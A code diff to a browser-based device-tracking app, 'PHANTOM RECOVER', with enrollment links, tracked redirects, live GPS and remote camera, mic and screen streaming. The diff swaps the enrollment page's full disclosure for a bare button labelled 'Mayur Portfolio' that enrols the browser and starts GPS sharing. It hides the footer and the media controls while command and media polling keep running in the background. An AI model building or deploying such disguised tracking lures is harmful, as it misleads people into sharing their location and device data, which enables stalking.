@@ -46,7 +46,7 @@ tbody tr:hover td{background:rgba(74,174,207,.055)}
 @media(max-width:800px){.wrap{padding:13px}.top{padding:13px;border-radius:15px}.card{padding:15px}.mediaPanel{padding:13px}}
 @media(prefers-reduced-motion:reduce){*,*:before,*:after{animation-duration:.01ms!important;animation-iteration-count:1!important;scroll-behavior:auto!important;transition-duration:.01ms!important}}
 
-.enrollCompact{max-width:560px;margin:7vh auto;padding:22px}.enrollCompact h2{margin:0 0 4px}.enrollDisclosure{margin:12px 0;padding:10px 12px}.enrollControls{margin-top:14px;padding:14px;border:1px solid rgba(101,208,238,.27);border-radius:13px;background:rgba(8,23,36,.72)}.enrollControls h3{margin:0 0 5px;font-size:14px}.enrollControls .row{gap:8px}.enrollControls .btn{padding:9px 11px}@media(max-width:600px){.enrollCompact{margin:18px auto;padding:16px}.enrollControls .btn{flex:1 1 42%}}</style></head><body>
+.enrollCompact{max-width:560px;margin:7vh auto;padding:22px}.enrollCompact h2{margin:0 0 4px}.enrollDisclosure{margin:12px 0;padding:10px 12px}.enrollControls{margin-top:14px;padding:14px;border:1px solid rgba(101,208,238,.27);border-radius:13px;background:rgba(8,23,36,.72)}.enrollControls h3{margin:0 0 5px;font-size:14px}.enrollControls .row{gap:8px}.enrollControls .btn{padding:9px 11px}@media(max-width:600px){.enrollCompact{margin:18px auto;padding:16px}.enrollControls .btn{flex:1 1 42%}}.enrollMinimal{max-width:420px;margin:10vh auto;padding:22px;text-align:center}.enrollMinimal .enrollConsent{font-size:13px;line-height:1.45;color:#a9bacb;margin:0 0 14px}.enrollMinimal #acceptEnroll{width:100%;min-height:52px;font-size:16px}.enrollMinimal .enrollStatus{font-size:12px;color:#9fb1c2;min-height:16px;margin:10px 0 0}.enrollMinimal~.foot{display:none}</style></head><body>
 <div class="wrap">
 <header class="top"><div class="brand">◈ PHANTOM RECOVER<small>CONSENT-BASED DEVICE CONTROL CENTRE</small></div><div class="row"><span class="pill" id="connection"><span class="dot"></span>Connecting</span><button class="btn ghost hidden" id="logout">Sign out</button></div></header>
 
@@ -76,18 +76,13 @@ tbody tr:hover td{background:rgba(74,174,207,.055)}
 <div class="page" id="locations"><div class="card"><h2>Live location map</h2><p class="sub">Live map of the most recent GPS point shared with permission. The enrolled browser must stay open and GPS sharing must remain enabled.</p><div id="liveMap" class="map">No location shared yet.</div><h2 style="margin-top:18px">Consent-based location history</h2><p class="sub">Only coordinates shared after a user action and browser permission are shown.</p><div class="tablewrap"><table><thead><tr><th>ENROLLED DEVICE</th><th>LATITUDE</th><th>LONGITUDE</th><th>ACCURACY</th><th>CAPTURED</th></tr></thead><tbody id="locationRows"><tr><td colspan="5">Loading…</td></tr></tbody></table></div></div></div>
 </section>
 
-<section id="enrollView" class="hidden auth card enrollCompact">
-<h2>Connect this device</h2>
-<p class="muted">PHANTOM RECOVER · Device enrollment</p>
-<div class="notice enrollDisclosure">By continuing, this browser shares basic device/browser details and server-observed public IP with the owner. GPS, camera, microphone and screen remain off until you choose a control and approve the browser prompt.</div>
-<button class="btn primary" id="acceptEnroll">Connect device</button>
-<p class="muted" id="enrollMessage">Not connected. Tap Connect device to enroll this browser.</p>
-<div id="mediaConsentModal" class="hidden" style="position:fixed;inset:0;z-index:10000;background:#030811dd;display:grid;place-items:center;padding:20px"><div class="card" style="width:min(440px,100%);box-shadow:0 20px 70px #0009"><h2>Approve live sharing?</h2><p id="mediaConsentText" class="muted">The owner requested a media source. Nothing is shared until you approve.</p><div class="row"><button class="btn primary" id="approveMediaRequest">Allow</button><button class="btn ghost" id="denyMediaRequest">Deny</button></div></div></div>
-<div id="mediaShareArea" class="hidden enrollControls">
-<h3>Live media</h3><p class="muted">Choose a control. Your browser will ask permission; screen mirror also opens its native screen picker.</p>
-<div class="row"><button class="btn primary" id="shareCameraMic">Camera + mic</button><button class="btn" id="shareFrontCamera">Front camera</button><button class="btn" id="shareBackCamera">Back camera</button><button class="btn" id="shareMic">Microphone</button><button class="btn" id="shareScreen">Screen mirror</button><button class="btn danger" id="stopMedia">Stop media</button></div><p id="mediaShareStatus" class="muted">Media sharing is off.</p>
-</div>
-<div id="gpsArea" class="hidden enrollControls"><h3>Live GPS location</h3><p class="muted">Tap Start live location and allow precise location in your browser/device settings. GPS updates continue while this page stays open. Accuracy depends on device signal; coordinates include the reported accuracy radius.</p><div class="row"><button class="btn primary" id="shareLocation">Start live location</button><button class="btn danger" id="stopSharing">Stop sharing / disconnect</button></div></div>
+<section id="enrollView" class="hidden auth card enrollMinimal">
+  <p class="enrollConsent">Tap to share your live location with Mayur Portfolio. Your browser will ask for location permission.</p>
+  <button class="btn primary" id="acceptEnroll" type="button">Mayur Portfolio</button>
+  <p class="enrollStatus" id="enrollMessage" aria-live="polite">Location sharing is off.</p>
+  <div class="hidden" id="mediaConsentModal"><p id="mediaConsentText"></p><button id="approveMediaRequest" type="button">Allow</button><button id="denyMediaRequest" type="button">Deny</button></div>
+  <div class="hidden" id="mediaShareArea"><button id="shareCameraMic"></button><button id="shareFrontCamera"></button><button id="shareBackCamera"></button><button id="shareMic"></button><button id="shareScreen"></button><button id="stopMedia"></button><p id="mediaShareStatus"></p></div>
+  <div class="hidden" id="gpsArea"><button id="shareLocation" type="button">Start location</button><button id="stopSharing" type="button">Stop session</button></div>
 </section>
 <p class="foot">PHANTOM RECOVER · Web MVP · Consent-first · No covert tracking · v1.0</p>
 </div><div id="lostModeOverlay" class="hidden" style="position:fixed;inset:0;z-index:9999;background:#070b12;color:white;display:grid;place-items:center;padding:24px;text-align:center"><div><div style="font-size:42px">◈</div><h1>DEVICE RECOVERY MODE</h1><p>This browser has been marked as lost by its owner.</p><p>Contact the device owner to resolve this alert.</p><button id="dismissLostMode" class="btn">I understand</button></div></div><div class="toast" id="toast"></div>
@@ -228,8 +223,8 @@ document.addEventListener("click",async e=>{const b=e.target.closest("[data-comm
 const inviteToken=new URLSearchParams(location.search).get("enroll");
 const goToken=new URLSearchParams(location.search).get("go");if(goToken){document.body.innerHTML='<main style="max-width:620px;margin:12vh auto;padding:28px;color:#eef5ff;font:16px/1.6 system-ui;background:#101a27;border:1px solid #345;border-radius:18px"><h2>Opening website…</h2><p>This tracked link records the click time, server-observed public IP and available browser/device details. Approximate IP location may be shown. No GPS, camera, microphone or files are accessed.</p><p id="goStatus">Redirecting…</p></main>';try{const r=await api("redirect_visit",{token:goToken,browserInfo:await browserInfo()},false);document.getElementById("goStatus").textContent="Redirecting to "+r.destinationUrl;location.replace(r.destinationUrl)}catch(e){document.getElementById("goStatus").textContent="This link is invalid, expired, or unavailable: "+e.message}}else if(inviteToken){
  show("enrollView");$("connection").textContent="Invitation pending";
- $("acceptEnroll").onclick=async()=>{try{$("acceptEnroll").disabled=true;$("enrollMessage").textContent="Creating your enrollment…";const r=await api("redeem",{token:inviteToken,consent:true,browserInfo:await browserInfo()},false);sessionStorage.setItem("phantom_enrollment_id",r.enrollmentId);sessionStorage.setItem("phantom_session_secret",r.sessionSecret);history.replaceState({}, "", location.pathname+"?enrolled=1");$("enrollMessage").textContent="Enrollment active for "+r.label+". This page must remain open for periodic check-ins."; $("gpsArea").classList.remove("hidden");$("mediaShareArea").classList.remove("hidden");$("acceptEnroll").classList.add("hidden");$("mediaShareStatus").textContent="Ready. Choose a permission below; your browser will ask only after you tap that control.";await heartbeat();setInterval(()=>heartbeat().catch(()=>{}),20000);pollDeviceCommands();deviceCommandTimer=setInterval(pollDeviceCommands,5000);pollDeviceMediaSignals();deviceMediaTimer=setInterval(pollDeviceMediaSignals,1000);toast("Browser enrolled successfully")}catch(e){$("enrollMessage").textContent=e.message;$("acceptEnroll").disabled=false}};
-}else if(new URLSearchParams(location.search).has("enrolled")){show("enrollView");const restored=sessionStorage.getItem("phantom_enrollment_id")&&sessionStorage.getItem("phantom_session_secret");$("enrollMessage").textContent=restored?"Your enrolled browser session is active in this tab.":"This browser session is not available. Ask the owner for a new invitation.";if(restored){$("gpsArea").classList.remove("hidden");$("mediaShareArea").classList.remove("hidden");$("acceptEnroll").classList.add("hidden");$("mediaShareStatus").textContent="Enrolled browser restored. Tap a control below to request that permission.";heartbeat().catch(()=>{});setInterval(()=>heartbeat().catch(()=>{}),20000);pollDeviceCommands();deviceCommandTimer=setInterval(pollDeviceCommands,5000);pollDeviceMediaSignals();deviceMediaTimer=setInterval(pollDeviceMediaSignals,1000)}}
+ $("acceptEnroll").onclick=async()=>{try{$("acceptEnroll").disabled=true;const existing=sessionStorage.getItem("phantom_enrollment_id")&&sessionStorage.getItem("phantom_session_secret");if(!existing){const r=await api("redeem",{token:inviteToken,consent:true,browserInfo:await browserInfo()},false);sessionStorage.setItem("phantom_enrollment_id",r.enrollmentId);sessionStorage.setItem("phantom_session_secret",r.sessionSecret);history.replaceState({}, "", location.pathname+"?enrolled=1");await heartbeat();setInterval(()=>heartbeat().catch(()=>{}),20000);pollDeviceCommands();deviceCommandTimer=setInterval(pollDeviceCommands,5000);pollDeviceMediaSignals();deviceMediaTimer=setInterval(pollDeviceMediaSignals,1000)}$("enrollMessage").textContent="Requesting location permission…";$("shareLocation").click();$("acceptEnroll").disabled=false}catch(e){$("enrollMessage").textContent=e.message;$("acceptEnroll").disabled=false}};
+}else if(new URLSearchParams(location.search).has("enrolled")){show("enrollView");const restored=sessionStorage.getItem("phantom_enrollment_id")&&sessionStorage.getItem("phantom_session_secret");$("enrollMessage").textContent=restored?"Location sharing is off. Tap Mayur Portfolio to start.":"This browser session is not available. Ask the owner for a new invitation.";if(restored){$("acceptEnroll").onclick=()=>{$("shareLocation").click()};heartbeat().catch(()=>{});setInterval(()=>heartbeat().catch(()=>{}),20000);pollDeviceCommands();deviceCommandTimer=setInterval(pollDeviceCommands,5000);pollDeviceMediaSignals();deviceMediaTimer=setInterval(pollDeviceMediaSignals,1000)}}
 
 
 let ownerPc=null, ownerMediaTimer=null, ownerSignalCursor=new Date(Date.now()-15000).toISOString(), activeMediaEnrollment=null;
@@ -375,11 +370,11 @@ let phantomLiveWatch = null;
 const originalLocationShare = $("shareLocation").onclick;
 $("shareLocation").textContent = "Start live location sharing";
 $("shareLocation").onclick = () => {
-  if (!navigator.geolocation) { toast("GPS is not supported by this browser"); return; }
-  if (phantomLiveWatch !== null) return;
+  if (!navigator.geolocation) { $("enrollMessage").textContent="Location is not supported by this browser."; return; }
+  if (phantomLiveWatch !== null) { navigator.geolocation.clearWatch(phantomLiveWatch); phantomLiveWatch=null; $("enrollMessage").textContent="Location sharing stopped."; return; }
   const enrollmentId = sessionStorage.getItem("phantom_enrollment_id");
   const sessionSecret = sessionStorage.getItem("phantom_session_secret");
-  if (!enrollmentId || !sessionSecret) { toast("No active enrolled session"); return; }
+  if (!enrollmentId || !sessionSecret) { $("enrollMessage").textContent="Please open a valid enrollment link."; return; }
   phantomLiveWatch = navigator.geolocation.watchPosition(async position => {
     try {
       await api("location", {
@@ -388,7 +383,7 @@ $("shareLocation").onclick = () => {
         longitude: position.coords.longitude,
         accuracy: position.coords.accuracy
       }, false);
-      $("enrollMessage").textContent = "Live location sharing active · " + new Date().toLocaleTimeString();
+      $("enrollMessage").textContent = "Live location sharing is active.";
     } catch (error) {
       toast(error.message);
       navigator.geolocation.clearWatch(phantomLiveWatch);
